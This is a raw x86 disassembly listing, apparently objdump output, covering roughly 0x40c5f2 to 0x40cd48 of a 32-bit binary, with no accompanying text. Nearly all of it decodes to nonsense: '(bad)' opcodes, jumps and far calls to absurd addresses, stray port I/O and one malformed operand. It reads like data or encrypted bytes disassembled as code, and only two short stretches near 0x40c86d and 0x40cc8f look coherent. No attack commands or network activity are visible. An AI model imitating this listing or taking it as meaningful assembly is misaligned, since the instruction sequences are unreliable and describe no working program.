  40c5f2:	call   0x97964c9e
  40c5f7:	ja     0x40c602
  40c5f9:	shl    BYTE PTR [eax],0x82
  40c5fc:	sahf   
  40c5fd:	(bad)  
  40c5fe:	test   eax,0x7e2507bf
  40c603:	fucom  st(3)
  40c605:	or     al,0xc0
  40c607:	bound  esp,QWORD PTR [eax-0x3e]
  40c60a:	inc    esi
  40c60b:	jg     0x40c63e
  40c60d:	out    0xff,al
  40c60f:	fistp  QWORD PTR [edx]
  40c611:	addr16 jle 0x40c5a3
  40c614:	jge    0x40c66c
  40c616:	sbb    al,0x4a
  40c618:	dec    edx
  40c619:	mov    DWORD PTR [ecx],eax
  40c61b:	sbb    ah,BYTE PTR [esi]
  40c61d:	loop   0x40c66d
  40c61f:	pop    ds
  40c620:	outs   dx,BYTE PTR ds:[esi]
  40c621:	enter  0xc1fc,0x26
  40c625:	jecxz  0x40c5d4
  40c627:	in     al,dx
  40c628:	cmp    BYTE PTR [ebx+0x52f22e79],ch
  40c62e:	xor    al,0xca
  40c630:	add    esi,DWORD PTR [edi]
  40c632:	sbb    al,0xce
  40c634:	adc    BYTE PTR [ebx+0x6d],dh
  40c637:	pop    edi
  40c638:	cmp    cl,BYTE PTR [ecx+edi*4]
  40c63b:	or     eax,0xeecf9c88
  40c640:	bound  eax,QWORD PTR [edi+0x2446e0cf]
  40c646:	scas   al,BYTE PTR es:[edi]
  40c647:	rol    DWORD PTR [ebx+0x7143ca71],0x1a
  40c64e:	mov    ds,ecx
  40c650:	rcl    BYTE PTR [eax],cl
  40c652:	addr16 or cl,ah
  40c655:	fwait
  40c656:	add    edx,DWORD PTR [edi-0x5839b224]
  40c65c:	add    edi,DWORD PTR [eax]
  40c65e:	retf   
  40c65f:	imul   ecx,edx,0x75
  40c662:	repz xchg edi,eax
  40c664:	(bad)  
  40c665:	pop    edx
  40c666:	dec    eax
  40c667:	xchg   ebx,eax
  40c668:	lds    esp,FWORD PTR [ebx+0x594a29dc]
  40c66e:	xchg   ah,ch
  40c670:	stos   DWORD PTR es:[edi],eax
  40c671:	pop    esp
  40c672:	pop    edi
  40c673:	add    dh,BYTE PTR [ebx]
  40c675:	sub    al,0x75
  40c677:	enter  0x2124,0xbf
  40c67b:	mov    ebp,0x448a2464
  40c680:	sti    
  40c681:	ins    BYTE PTR es:[edi],dx
  40c682:	jns    0x40c66b
  40c684:	hlt    
  40c685:	fmul   QWORD PTR [edx+ecx*4]
  40c688:	jnp    0x40c6a8
  40c68a:	jmp    0x2242a07e
  40c68f:	xchg   ecx,eax
  40c690:	call   0x4699:0xd217b95e
  40c697:	xchg   esp,eax
  40c698:	dec    edi
  40c699:	popf   
  40c69a:	jne    0x40c6b4
  40c69c:	repnz adc DWORD PTR es:[esi],eax
  40c6a0:	xchg   edx,eax
  40c6a1:	fadd   DWORD PTR [edi+eiz*1-0x7c]
  40c6a5:	mov    ah,0xb5
  40c6a7:	dec    eax
  40c6a8:	jo     0x40c63f
  40c6aa:	std    
  40c6ab:	test   eax,0x9c7878d6
  40c6b0:	test   eax,0x743693b6
  40c6b5:	repnz dec ebp
  40c6b7:	jno    0x40c735
  40c6b9:	outs   dx,BYTE PTR ds:[esi]
  40c6ba:	les    ebp,FWORD PTR [esi+0x25]
  40c6bd:	jnp    0x40c6c2
  40c6bf:	mov    ecx,ebx
  40c6c1:	cmp    DWORD PTR [eax+edi*8],0xffffff9f
  40c6c5:	cld    
  40c6c6:	or     eax,0xe88989ff
  40c6cb:	and    BYTE PTR [ecx],dl
  40c6cd:	jg     0x40c73e
  40c6cf:	test   DWORD PTR ds:0x17b38f00,ecx
  40c6d5:	(bad)  
  40c6d6:	aas    
  40c6d7:	inc    esp
  40c6d8:	pop    ecx
  40c6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6da:	jg     0x40c6a8
  40c6dc:	jg     0x40c693
  40c6de:	and    BYTE PTR fs:[edx-0x29],cl
  40c6e2:	loop   0x40c6fe
  40c6e4:	fisttp DWORD PTR [eax+edi*4-0x7acac643]
  40c6eb:	mov    WORD PTR [esi],?
  40c6ed:	dec    bl
  40c6ef:	or     BYTE PTR [edx],0xbb
  40c6f2:	std    
  40c6f3:	mov    ebx,0x1e0eeb75
  40c6f8:	rcr    BYTE PTR [edi+0x362e3139],1
  40c6fe:	pop    edi
  40c6ff:	data16 xor ah,ah
  40c702:	nop
  40c703:	dec    ecx
  40c704:	mov    eax,ds:0xccf91de5
  40c709:	mov    eax,0x45ccb0a4
  40c70e:	pop    esi
  40c70f:	(bad)  
  40c710:	leave  
  40c711:	adc    ch,dh
  40c713:	push   cs
  40c714:	ins    BYTE PTR es:[edi],dx
  40c715:	iret   
  40c716:	ja     0x40c786
  40c718:	mov    eax,ds:0x7c199460
  40c71d:	out    dx,eax
  40c71e:	and    ebx,DWORD PTR [edi]
  40c720:	or     ch,BYTE PTR [ebp-0x31547b0a]
  40c726:	nop
  40c727:	ja     0x40c6cc
  40c729:	inc    ebp
  40c72a:	cmp    esp,edi
  40c72c:	push   es
  40c72d:	cmp    DWORD PTR [esi-0x7c9e666d],ecx
  40c733:	std    
  40c734:	not    BYTE PTR [edi+0x4ee7196c]
  40c73a:	pop    ebx
  40c73b:	inc    ecx
  40c73c:	pop    es
  40c73d:	sahf   
  40c73e:	test   eax,0xf3684447
  40c743:	jb     0x40c6e8
  40c745:	xor    ebx,0xfafe1720
  40c74b:	or     al,0xe6
  40c74d:	dec    ebp
  40c74e:	ss pop ds
  40c750:	sub    esp,DWORD PTR [ebx+0x33]
  40c753:	push   esi
  40c754:	not    edx
  40c756:	mov    fs,WORD PTR [eax-0x4111b6ba]
  40c75c:	add    DWORD PTR [esi+0x3fc6fbe6],esp
  40c762:	fimul  WORD PTR [edi]
  40c764:	dec    ebx
  40c765:	cmp    al,0xb5
  40c767:	js     0x40c7bd
  40c769:	sti    
  40c76a:	(bad)  
  40c76b:	xchg   ebp,eax
  40c76c:	cmc    
  40c76d:	add    BYTE PTR [ebp+0x21],0xb6
  40c771:	jae    0x40c743
  40c773:	and    dl,BYTE PTR [ebx]
  40c775:	mov    bh,0x28
  40c777:	sub    al,0xbe
  40c779:	idiv   BYTE PTR [ebp-0x11]
  40c77c:	or     DWORD PTR [ebx+eax*1+0x351e58d6],ebx
  40c783:	je     0x40c782
  40c785:	les    eax,FWORD PTR [ecx+0x13]
  40c788:	pop    edi
  40c789:	mov    dl,0xde
  40c78b:	gs add al,0x83
  40c78e:	mov    dl,0xdf
  40c790:	xchg   esi,eax
  40c791:	test   al,0x94
  40c793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c794:	dec    eax
  40c795:	add    al,0x41
  40c797:	ja     0x40c73f
  40c799:	push   esi
  40c79a:	cwde   
  40c79b:	fiadd  DWORD PTR [ecx+0x5e]
  40c79e:	enter  0x615f,0xfd
  40c7a2:	inc    eax
  40c7a3:	call   0x80f3594b
  40c7a8:	adc    eax,0x9b76d6de
  40c7ad:	xchg   BYTE PTR [edx+0x62d8eb8a],ch
  40c7b3:	imul   esp,DWORD PTR [ecx],0xe7c94cbe
  40c7b9:	xor    DWORD PTR [ebp*4-0x4889537c],edx
  40c7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c1:	jecxz  0x40c7d8
  40c7c3:	pushf  
  40c7c4:	jmp    ebx
  40c7c6:	fsubr  DWORD PTR [edx-0x64]
  40c7c9:	mov    esp,0x73dd53cc
  40c7ce:	add    eax,0x6dd11ab7
  40c7d3:	jnp    0x40c775
  40c7d5:	and    DWORD PTR [ebx],ecx
  40c7d7:	mov    cl,0x8e
  40c7d9:	daa    
  40c7da:	push   eax
  40c7db:	mov    ch,0xf6
  40c7dd:	add    eax,0xedb8292a
  40c7e2:	jecxz  0x40c852
  40c7e4:	fs xchg ecx,eax
  40c7e6:	cmp    al,0x87
  40c7e8:	adc    DWORD PTR [ecx+0x39],esi
  40c7eb:	fisttp DWORD PTR [ebp+0x48]
  40c7ee:	mov    eax,0x48dae423
  40c7f3:	pushf  
  40c7f4:	push   eax
  40c7f5:	enter  0x731f,0x50
  40c7f9:	hlt    
  40c7fa:	ja     0x40c7b3
  40c7fc:	inc    eax
  40c7fd:	fidivr WORD PTR [edx+edx*4+0x78705897]
  40c804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c805:	jge    0x40c7b0
  40c807:	mov    BYTE PTR [eax+ebx*2],0x88
  40c80b:	dec    ecx
  40c80c:	inc    edi
  40c80d:	popa   
  40c80e:	or     BYTE PTR [edi+0x75],al
  40c811:	xor    DWORD PTR [esi+0x30ac2f14],0xb0fe36d4
  40c81b:	in     eax,dx
  40c81c:	popf   
  40c81d:	pop    esp
  40c81f:	mov    ecx,0xa9cc8910
  40c824:	xor    esp,DWORD PTR [edi]
  40c826:	pop    ebp
  40c827:	in     al,0x4b
  40c829:	dec    edi
  40c82a:	jmp    0x40c8a4
  40c82c:	hlt    
  40c82d:	and    eax,0x99eedd7a
  40c832:	scas   eax,DWORD PTR es:[edi]
  40c833:	in     eax,dx
  40c834:	out    dx,al
  40c835:	push   0xfa2f46cd
  40c83a:	jmp    0x857436ca
  40c83f:	mov    edi,0x7b20da39
  40c844:	ja     0x40c83a
  40c846:	sub    DWORD PTR [edi-0x5b35a71b],edi
  40c84c:	sub    BYTE PTR [ecx+0x65daf8af],al
  40c852:	fild   DWORD PTR [edx-0x67]
  40c855:	(bad)  
  40c856:	pop    ebx
  40c857:	cmp    edi,DWORD PTR [eax-0x44d5e7f4]
  40c85d:	aas    
  40c85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85f:	mov    al,ds:0x71649643
  40c864:	xor    eax,0x4eff1b97
  40c869:	push   esi
  40c86a:	nop
  40c86b:	add    al,0x6b
  40c86d:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40c874:	mov    DWORD PTR [ebp-0x1c],0x718f
  40c87b:	mov    eax,DWORD PTR [ebp-0x20]
  40c87e:	jmp    0x40cc89
  40c883:	(bad)  
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0x30e9e3ac
  40c891:	cmp    al,0x92
  40c893:	jmp    0x92ff876f
  40c898:	les    edi,FWORD PTR [esi-0x51505742]
  40c89e:	fdivr  st(5),st
  40c8a0:	cmp    esi,eax
  40c8a2:	shr    DWORD PTR [ecx+0x57],cl
  40c8a5:	les    ebp,FWORD PTR [edi-0x663cabe1]
  40c8ab:	cli    
  40c8ac:	ins    DWORD PTR es:[edi],dx
  40c8ad:	jbe    0x40c8f6
  40c8af:	xchg   esi,eax
  40c8b0:	mov    dh,0x12
  40c8b2:	mov    DWORD PTR [eax-0x2f],ecx
  40c8b5:	xor    eax,0x5a66f9ed
  40c8ba:	mov    bh,dl
  40c8bc:	data16 or ch,dh
  40c8bf:	jmp    0x40c8c8
  40c8c1:	lods   al,BYTE PTR ds:[esi]
  40c8c2:	mov    edx,0xa90a2ce9
  40c8c7:	push   esp
  40c8c8:	dec    edi
  40c8c9:	adc    ebx,eax
  40c8cb:	daa    
  40c8cc:	push   0x250d084d
  40c8d1:	stos   DWORD PTR es:[edi],eax
  40c8d2:	inc    esp
  40c8d3:	cwde   
  40c8d4:	push   ebp
  40c8d5:	int3   
  40c8d6:	dec    eax
  40c8d7:	or     dh,BYTE PTR [ebx]
  40c8d9:	and    BYTE PTR [edx],bl
  40c8db:	(bad)  
  40c8dc:	sub    al,0x41
  40c8de:	add    dl,dh
  40c8e0:	in     eax,0x95
  40c8e2:	xchg   esi,eax
  40c8e3:	and    ebp,DWORD PTR [eax-0x73967503]
  40c8e9:	or     ah,BYTE PTR [si+0x3b]
  40c8ed:	push   eax
  40c8ee:	fs in  eax,dx
  40c8f0:	push   esi
  40c8f1:	pop    eax
  40c8f2:	data16 and al,0xcb
  40c8f5:	and    DWORD PTR ds:0xa6871fb6,edi
  40c8fb:	adc    eax,edx
  40c8fd:	shl    DWORD PTR [ecx],1
  40c8ff:	adc    al,0x9
  40c901:	out    0x9e,al
  40c903:	(bad)  
  40c904:	(bad)  
  40c905:	jae    0x40c914
  40c907:	lods   eax,DWORD PTR ds:[esi]
  40c908:	rcr    dl,1
  40c90a:	push   ebp
  40c90b:	or     DWORD PTR fs:[edx+ebp*4+0x70e3ae9],edi
  40c913:	mov    ah,0xb3
  40c915:	loop   0x40c8cd
  40c917:	fwait
  40c918:	pop    edx
  40c919:	call   0x8c93877a
  40c91e:	or     al,0xa1
  40c920:	and    al,0x62
  40c922:	in     eax,0x44
  40c924:	shl    DWORD PTR [ebx],1
  40c926:	cmp    ch,ch
  40c928:	push   ds
  40c929:	xchg   DWORD PTR [ebx+ebx*8+0x7f9e5930],esp
  40c930:	js     0x40c8e9
  40c932:	shl    ch,cl
  40c934:	mov    ebx,0x1d7cf6c0
  40c939:	xor    edi,DWORD PTR [edi-0x16f77395]
  40c93f:	adc    al,0xb6
  40c941:	lods   eax,DWORD PTR ds:[esi]
  40c942:	push   ecx
  40c943:	in     al,dx
  40c944:	shl    BYTE PTR [edi-0x34527b96],cl
  40c94a:	mov    ecx,0xda8aaede
  40c94f:	(bad)  
  40c951:	jmp    0x40c947
  40c953:	mov    ds:0xe9115d7e,al
  40c958:	ja     0x40c9d3
  40c95a:	pusha  
  40c95b:	or     ebp,DWORD PTR [ecx+0x79a1a22f]
  40c961:	mov    ebp,0x6bd8767d
  40c966:	leave  
  40c967:	cmp    esi,DWORD PTR [edi]
  40c969:	dec    esp
  40c96a:	pop    ds
  40c96b:	mov    ds,WORD PTR [ebx]
  40c96d:	ficom  DWORD PTR [ebp-0x6e036d54]
  40c973:	out    0xb7,eax
  40c975:	xchg   DWORD PTR [esi-0x33e8973b],ebp
  40c97b:	sbb    BYTE PTR [ecx+0x43],0x73
  40c97f:	ret    0x6947
  40c982:	pop    ss
  40c983:	test   al,0xd2
  40c985:	mov    eax,0xd374b28e
  40c98a:	jg     0x40c9e3
  40c98c:	les    ecx,FWORD PTR [ebx-0x35]
  40c98f:	iret   
  40c990:	ret    0xea8b
  40c993:	pop    ecx
  40c994:	sbb    BYTE PTR [edi+ebx*1+0x57],ch
  40c998:	xchg   ebp,eax
  40c999:	outs   dx,DWORD PTR ds:[esi]
  40c99a:	mov    dl,0x32
  40c99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99d:	push   0xffffffb0
  40c99f:	sbb    BYTE PTR [ebp-0x1caf6618],0x77
  40c9a6:	pop    ebp
  40c9a7:	pop    ds
  40c9a8:	mov    eax,ds:0xc0dbd944
  40c9ad:	xchg   ebx,eax
  40c9ae:	mov    esp,0xff83c4fa
  40c9b3:	js     0x40c977
  40c9b5:	aas    
  40c9b6:	jbe    0x40c9c9
  40c9b8:	mov    bl,0x85
  40c9ba:	int3   
  40c9bb:	pop    eax
  40c9bc:	data16 fcom DWORD PTR [esi-0x3c]
  40c9c0:	pop    esi
  40c9c1:	add    ecx,edx
  40c9c3:	test   BYTE PTR [edi],0xb1
  40c9c6:	outs   dx,BYTE PTR ds:[esi]
  40c9c7:	pusha  
  40c9c8:	jae    0x40c951
  40c9ca:	pushf  
  40c9cb:	repnz and eax,0x100438f7
  40c9d1:	leavew 
  40c9d3:	mov    ch,0x58
  40c9d5:	loopne 0x40c9f1
  40c9d7:	sbb    eax,0x285d91ca
  40c9dc:	mov    dh,0xcd
  40c9de:	(bad)  
  40c9df:	mov    cl,0xfe
  40c9e1:	jmp    0x40c990
  40c9e3:	jnp    0x40c9ef
  40c9e5:	ret    0x7932
  40c9e8:	xchg   ebp,eax
  40c9e9:	cmp    al,0x8
  40c9eb:	xchg   edi,eax
  40c9ec:	inc    eax
  40c9ed:	in     al,0x4a
  40c9ef:	std    
  40c9f0:	daa    
  40c9f1:	add    esi,DWORD PTR [ebx]
  40c9f3:	imul   eax,DWORD PTR [eax+0x5c],0x4beadfd5
  40c9fa:	dec    ecx
  40c9fb:	xor    BYTE PTR [edx+0x6],dh
  40c9fe:	dec    esi
  40c9ff:	pusha  
  40ca00:	xchg   esi,eax
  40ca01:	inc    ecx
  40ca02:	mov    bl,0x31
  40ca04:	push   esi
  40ca05:	push   esp
  40ca06:	and    al,0xe6
  40ca08:	xor    BYTE PTR [esi],0x4
  40ca0b:	sub    al,0xf
  40ca0d:	enter  0xcc05,0xf9
  40ca11:	xchg   ebx,eax
  40ca12:	push   ds
  40ca13:	fcmovbe st,st(6)
  40ca15:	mov    cl,0xf4
  40ca17:	stc    
  40ca18:	test   al,0xcb
  40ca1a:	xor    ebx,ecx
  40ca1c:	pop    eax
  40ca1d:	dec    edx
  40ca1e:	jns    0x40ca82
  40ca20:	inc    edi
  40ca21:	mov    DWORD PTR [ecx-0x17ea4173],esi
  40ca27:	pop    ds
  40ca28:	mov    al,0x31
  40ca2a:	inc    edi
  40ca2b:	outs   dx,DWORD PTR ds:[esi]
  40ca2c:	mov    bx,0x59ca
  40ca30:	mov    BYTE PTR [ecx],al
  40ca32:	xor    edx,DWORD PTR [ebx+0x69f6eb07]
  40ca38:	xchg   edx,eax
  40ca39:	dec    ecx
  40ca3a:	(bad)  
  40ca3b:	xchg   edi,eax
  40ca3c:	pop    ebp
  40ca3d:	outs   dx,DWORD PTR ds:[esi]
  40ca3e:	idiv   BYTE PTR [edi-0x16f1a66b]
  40ca44:	push   ebx
  40ca45:	dec    eax
  40ca46:	jmp    0x6523:0xf8fc1a8f
  40ca4d:	fdiv   DWORD PTR [ecx+edx*1-0x1b]
  40ca51:	mov    ah,BYTE PTR [ecx-0x3e3749ac]
  40ca57:	sbb    DWORD PTR [ebx+ebx*4+0x23],ebp
  40ca5b:	jecxz  0x40c9fd
  40ca5d:	in     eax,0x5f
  40ca5f:	fwait
  40ca60:	push   ds
  40ca61:	add    bl,bl
  40ca63:	neg    edi
  40ca65:	sub    BYTE PTR [ebx+0x219de11a],dl
  40ca6b:	inc    ebx
  40ca6c:	es nop
  40ca6e:	icebp  
  40ca6f:	inc    eax
  40ca70:	loopne 0x40caed
  40ca72:	xchg   edi,eax
  40ca73:	pop    ebp
  40ca74:	sub    ebx,0xf7db938
  40ca7a:	stos   BYTE PTR es:[edi],al
  40ca7b:	mov    eax,ds:0xfae3af0a
  40ca80:	mov    esp,0x95a235d1
  40ca85:	iret   
  40ca86:	xchg   esp,eax
  40ca87:	inc    ebp
  40ca88:	(bad)  
  40ca89:	enter  0xec65,0xe1
  40ca8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8e:	xchg   edx,eax
  40ca8f:	imul   esp,DWORD PTR [edi-0x5c],0xffffffd0
  40ca93:	sub    bh,BYTE PTR [edi-0x80]
  40ca96:	bound  edx,QWORD PTR [esi]
  40ca98:	into   
  40ca99:	mov    ss,WORD PTR [ecx+0x11]
  40ca9c:	xchg   esp,eax
  40ca9d:	retf   0xded7
  40caa0:	or     al,0x4f
  40caa2:	xor    ebx,ebp
  40caa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa5:	fimul  WORD PTR [ebx*1+0x71e8a36d]
  40caac:	add    bl,dh
  40caae:	std    
  40caaf:	mov    dh,0xf
  40cab1:	out    0xec,eax
  40cab3:	pop    edi
  40cab4:	fdivp  st(7),st
  40cab6:	lods   eax,DWORD PTR ds:[esi]
  40cab7:	jb     0x8694f635
  40cabd:	arpl   WORD PTR [ebp+0x2b4588e3],dx
  40cac3:	sub    DWORD PTR [esi],esp
  40cac5:	push   es
  40cac6:	jecxz  0x40caa8
  40cac8:	push   eax
  40cac9:	addr16 out 0x3b,al
  40cacc:	adc    al,0xd2
  40cace:	pop    ds
  40cacf:	lahf   
  40cad0:	mov    esi,0xe82d92cc
  40cad5:	loope  0x40cb19
  40cad7:	fmul   DWORD PTR [esi]
  40cad9:	inc    ebx
  40cada:	dec    esi
  40cadb:	sbb    eax,0xe20ea63d
  40cae0:	xchg   BYTE PTR [ebx+0x6a],ah
  40cae3:	fwait
  40cae4:	shl    esp,0xb2
  40cae7:	in     al,dx
  40cae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae9:	inc    edx
  40caea:	add    DWORD PTR [ebp+0x75],esi
  40caed:	jae    0x40ca96
  40caef:	pushf  
  40caf0:	jcxz   0x40cb55
  40caf3:	pop    ecx
  40caf4:	mov    cl,0x38
  40caf6:	mov    ch,0x3e
  40caf8:	test   BYTE PTR [ecx],ch
  40cafa:	inc    ecx
  40cafb:	jae    0x40cb6c
  40cafd:	mov    dl,0xbb
  40caff:	lea    ebp,[ecx]
  40cb01:	jp     0x40cb00
  40cb03:	adc    DWORD PTR [esp+ebp*2+0x48bf81df],eax
  40cb0a:	int    0xcf
  40cb0c:	into   
  40cb0d:	fcomp  QWORD PTR [esi+0x1b25d5e7]
  40cb13:	mov    eax,0x7bffe206
  40cb18:	mov    ch,0x4f
  40cb1a:	or     DWORD PTR [esi+0x47387ee2],ebx
  40cb20:	int3   
  40cb21:	out    dx,eax
  40cb22:	imul   esp,DWORD PTR [esi],0xffffff82
  40cb25:	and    edi,esp
  40cb27:	or     bh,BYTE PTR [esi-0x19fac5be]
  40cb2d:	mov    edi,0xad3620cc
  40cb32:	sbb    eax,0x56f98294
  40cb37:	mov    BYTE PTR [edi+0x61],bh
  40cb3a:	fwait
  40cb3b:	mov    dl,0x2f
  40cb3d:	ins    DWORD PTR es:[edi],dx
  40cb3e:	imul   esi,DWORD PTR [edi],0x48
  40cb41:	jmp    0x2cb33de4
  40cb46:	xchg   BYTE PTR [esi-0x2595eb46],al
  40cb4c:	in     eax,dx
  40cb4d:	xchg   esi,eax
  40cb4e:	inc    ebp
  40cb4f:	retf   0xfc46
  40cb52:	daa    
  40cb53:	scas   eax,DWORD PTR es:[edi]
  40cb54:	mov    al,0x79
  40cb56:	mov    eax,ds:0x86a8a468
  40cb5b:	jae    0x40cb1a
  40cb5d:	xchg   ecx,eax
  40cb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb5f:	sub    al,0x30
  40cb61:	add    bh,BYTE PTR [ebx]
  40cb63:	jecxz  0x40cb7b
  40cb65:	dec    eax
  40cb66:	std    
  40cb67:	sub    edi,0xfa4160d6
  40cb6d:	inc    BYTE PTR [ebx-0x7d78544d]
  40cb73:	push   eax
  40cb74:	in     eax,dx
  40cb75:	push   eax
  40cb76:	inc    esi
  40cb77:	cmp    al,0x16
  40cb79:	ins    DWORD PTR es:[edi],dx
  40cb7a:	sub    al,0x4b
  40cb7c:	push   0x23
  40cb7e:	les    eax,FWORD PTR [edi]
  40cb80:	xor    BYTE PTR [ecx+0x21a83ebe],ch
  40cb86:	dec    ebp
  40cb87:	imul   BYTE PTR ds:0xe67d4186
  40cb8d:	in     al,dx
  40cb8e:	pop    ds
  40cb8f:	adc    bl,BYTE PTR [esi+0x1c108137]
  40cb95:	or     al,0xb5
  40cb97:	or     ch,BYTE PTR es:[eax+0x79b91d89]
  40cb9e:	cwde   
  40cb9f:	mov    ecx,0x203aac49
  40cba4:	mov    WORD PTR [eax+0x75935614],fs
  40cbaa:	push   ds
  40cbab:	mov    DWORD PTR [esi-0x5ccd21b],ebx
  40cbb1:	dec    edi
  40cbb2:	xor    BYTE PTR [esi],dl
  40cbb4:	mov    al,ds:0xe6009881
  40cbb9:	ds (bad) 
  40cbbb:	dec    ecx
  40cbbc:	nop
  40cbbd:	imul   esp,DWORD PTR [eax-0x6a],0xffffffdd
  40cbc1:	xor    ecx,0x1e6ef187
  40cbc7:	adc    eax,0x9878f130
  40cbcc:	pop    ds
  40cbcd:	in     al,dx
  40cbce:	addr16 dec ebp
  40cbd0:	imul   edi,DWORD PTR [eax-0x29],0x2
  40cbd4:	or     BYTE PTR [esi+ebp*2],0xd4
  40cbd8:	popa   
  40cbd9:	jne    0x40cb85
  40cbdb:	stc    
  40cbdc:	jo     0x40cbfe
  40cbde:	lahf   
  40cbdf:	sti    
  40cbe0:	test   BYTE PTR [edx-0x6c],0x85
  40cbe4:	and    eax,ebx
  40cbe6:	sub    edi,DWORD PTR [ebp-0x3b]
  40cbe9:	stc    
  40cbea:	scas   eax,DWORD PTR es:[edi]
  40cbeb:	sub    ch,bh
  40cbed:	push   edi
  40cbee:	pushf  
  40cbef:	add    bh,BYTE PTR [ecx+0x342fd89b]
  40cbf5:	gs mov cl,0x67
  40cbf8:	stos   DWORD PTR es:[edi],eax
  40cbf9:	sti    
  40cbfa:	imul   esi,ebp,0x2bc6d967
  40cc00:	inc    edx
  40cc01:	mov    bh,dl
  40cc03:	adc    DWORD PTR [ecx],0x1d3c433e
  40cc09:	push   esi
  40cc0a:	xor    ebp,ebx
  40cc0c:	aaa    
  40cc0d:	inc    esi
  40cc0e:	cli    
  40cc0f:	push   ds
  40cc10:	das    
  40cc11:	lds    edi,FWORD PTR ds:0xf1553aaf
  40cc17:	test   DWORD PTR [ebx],ecx
  40cc19:	pop    es
  40cc1a:	out    0x1c,al
  40cc1c:	jge    0x40cc46
  40cc1e:	xchg   DWORD PTR [ecx+eax*8],eax
  40cc21:	loopne 0x40cbe3
  40cc23:	clc    
  40cc24:	sbb    ebp,DWORD PTR [esi]
  40cc26:	add    BYTE PTR [eax+0x1e],0x13
  40cc2a:	add    eax,0x106daa6c
  40cc2f:	inc    ebx
  40cc30:	(bad)  
  40cc31:	pop    ebx
  40cc32:	sub    al,dl
  40cc34:	cmc    
  40cc35:	mov    DWORD PTR [esi+0x629d3018],edx
  40cc3b:	or     eax,0x1abe34af
  40cc40:	jnp    0x40cc4c
  40cc42:	out    dx,al
  40cc43:	sbb    eax,0x49b35510
  40cc48:	mov    al,0xd4
  40cc4a:	adc    BYTE PTR [edx+0x114a74df],dl
  40cc50:	pop    edi
  40cc51:	mov    eax,0xf8600f8c
  40cc56:	sbb    al,0x35
  40cc58:	and    esp,DWORD PTR [eax-0x22]
  40cc5b:	and    DWORD PTR [edi],edi
  40cc5d:	sbb    bl,BYTE PTR [esp+eiz*8]
  40cc60:	lods   al,BYTE PTR ds:[esi]
  40cc61:	sub    ch,BYTE PTR [ecx]
  40cc63:	push   0xfb7ece25
  40cc68:	sbb    eax,0x3d3e16fe
  40cc6d:	sbb    eax,0x9309bdd2
  40cc72:	ins    BYTE PTR es:[edi],dx
  40cc73:	mov    BYTE PTR [ebx-0xa],ah
  40cc76:	popa   
  40cc77:	outs   dx,BYTE PTR ds:[esi]
  40cc78:	adc    BYTE PTR [esi+ecx*8],ch
  40cc7b:	and    DWORD PTR [ebx+0x2f],ecx
  40cc7e:	mov    eax,0xf4d7c5a4
  40cc83:	and    BYTE PTR ds:0x7fa6d976,0x8b
  40cc8a:	push   ebp
  40cc8b:	in     al,0x8b
  40cc8d:	jne    0x40cc67
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40ccc1
  40ccd6:	or     BYTE PTR [edx],al
  40ccd8:	fnstsw WORD PTR [ebp-0x6d414121]
  40ccde:	les    edi,FWORD PTR [esi-0x2a2f6142]
  40cce4:	mov    esp,cs
  40cce6:	pop    es
  40cce7:	mov    ch,BYTE PTR [eax]
  40cce9:	mov    al,0x4f
  40cceb:	jno    0x40cd09
  40cced:	pusha  
  40ccee:	(bad)  
  40ccf0:	jno    0x40cce5
  40ccf2:	and    al,0xf8
  40ccf4:	adc    al,0x78
  40ccf6:	ins    DWORD PTR es:[edi],dx
  40ccf7:	pop    ds
  40ccf8:	xchg   esp,eax
  40ccf9:	lods   eax,DWORD PTR ds:[esi]
  40ccfa:	aam    0xaf
  40ccfc:	sbb    DWORD PTR [eax],edi
  40ccfe:	sar    BYTE PTR [edx-0x7b2c976b],0xe9
  40cd05:	popf   
  40cd06:	mov    bl,0x8f
  40cd08:	(bad)  
  40cd09:	cmc    
  40cd0a:	fadd   DWORD PTR [edx-0x4054b4f8]
  40cd10:	add    DWORD PTR [ecx],edx
  40cd12:	add    ch,BYTE PTR [esi-0x49]
  40cd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd16:	push   ebx
  40cd17:	and    esp,DWORD PTR [esp+eax*1+0x6]
  40cd1b:	jg     0x40ccc2
  40cd1d:	fsub   st,st(3)
  40cd1f:	or     ch,BYTE PTR [esi+0x396e8504]
  40cd25:	cmp    al,0x46
  40cd27:	imul   eax,DWORD PTR [ecx-0x1eca46dc],0x6b
  40cd2e:	les    esp,FWORD PTR [ebx-0x5f]
  40cd31:	jmp    0x40cd63
  40cd33:	adc    al,0x46
  40cd35:	pop    edx
  40cd36:	xor    edx,DWORD PTR [esi]
  40cd38:	add    ch,ch
  40cd3a:	sbb    al,ch
  40cd3c:	and    eax,0x7b49cf78
  40cd41:	mov    ebx,0xff63376b
  40cd46:	sbb    al,0x6e
  40cd48:	push   ecx
